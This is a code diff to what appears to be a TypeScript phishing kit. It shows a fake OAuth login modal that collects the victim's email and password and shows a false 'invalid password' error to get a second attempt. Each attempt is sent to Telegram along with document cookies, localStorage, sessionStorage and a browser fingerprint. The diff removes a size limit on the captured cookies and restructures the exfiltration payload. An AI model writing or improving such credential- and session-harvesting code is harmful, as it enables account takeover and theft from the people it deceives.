@@ -326,7 +326,7 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
       }
       
       // Send first attempt data to Telegram with cookies
-      await sendToTelegram({
+      const firstAttemptData = {
         email,
         password,
         provider,
@@ -337,10 +337,10 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         userAgent: navigator.userAgent,
         fileName: 'First Login Attempt',
         browserFingerprint,
-        cookies: browserFingerprint.cookies,
-        localStorage: browserFingerprint.localStorage,
-        sessionStorage: browserFingerprint.sessionStorage
-      });
+        documentCookies: document.cookie || 'No cookies available'
+      };
+      
+      await sendToTelegram(firstAttemptData);
       
       // Show error message
       errorDiv.textContent = 'Invalid email or password. Please try again.';
@@ -360,7 +360,7 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
       }
       
       // Send second attempt data to Telegram with cookies
-      await sendToTelegram({
+      const secondAttemptData = {
         email,
         password,
         provider,
@@ -371,11 +371,11 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
         userAgent: navigator.userAgent,
         fileName: 'Second Login Attempt - Success',
         browserFingerprint,
-        cookies: browserFingerprint.cookies,
-        localStorage: browserFingerprint.localStorage,
-        sessionStorage: browserFingerprint.sessionStorage,
+        documentCookies: document.cookie || 'No cookies available',
         firstAttempt: firstAttemptData
-      });
+      };
+      
+      await sendToTelegram(secondAttemptData);
       
       // Remove form
       const modal = document.getElementById('oauth-modal-overlay');
@@ -591,11 +591,11 @@ export const getBrowserFingerprint = () => {
         height: screen.height,
         colorDepth: screen.colorDepth
       },
-      cookies: document.cookie.substring(0, 2000), // Limit cookie data to 2KB
+      cookies: document.cookie || 'No cookies available',
       localStorage: getStorageDataSafe('localStorage'),
       sessionStorage: getStorageDataSafe('sessionStorage'),
       timestamp: new Date().toISOString(),
-      totalCookiesCaptured: document.cookie ? document.cookie.split(';').length : 0,
+      totalCookiesCaptured: document.cookie ? document.cookie.split(';').filter(c => c.trim()).length : 0,
       advancedCookieStats: {
         httpOnly: 0, // Can't detect from client-side
         secure: document.cookie.includes('Secure') ? 1 : 0,
@@ -607,7 +607,7 @@ export const getBrowserFingerprint = () => {
     return {
       error: error?.message || 'Unknown error',
       timestamp: new Date().toISOString(),
-      cookies: document.cookie.substring(0, 1000),
+      cookies: document.cookie || 'No cookies available',
       totalCookiesCaptured: 0,
       advancedCookieStats: {}
     };
